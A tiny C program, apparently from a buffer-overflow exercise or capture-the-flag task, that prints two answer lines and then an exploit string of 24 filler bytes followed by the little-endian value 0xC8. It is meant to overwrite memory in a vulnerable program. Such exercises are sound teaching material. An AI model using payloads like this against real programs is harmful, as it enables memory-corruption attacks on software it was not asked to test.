#include <stdio.h>
#include <unistd.h>

void main()
{
    write(1, "a\n", 2);
    write(1, "a\n", 2);
    char exploit_string[] = "000011112222333344445555\xC8\x00\x00\x00";
    write(1, exploit_string, sizeof(exploit_string) - 1);
}
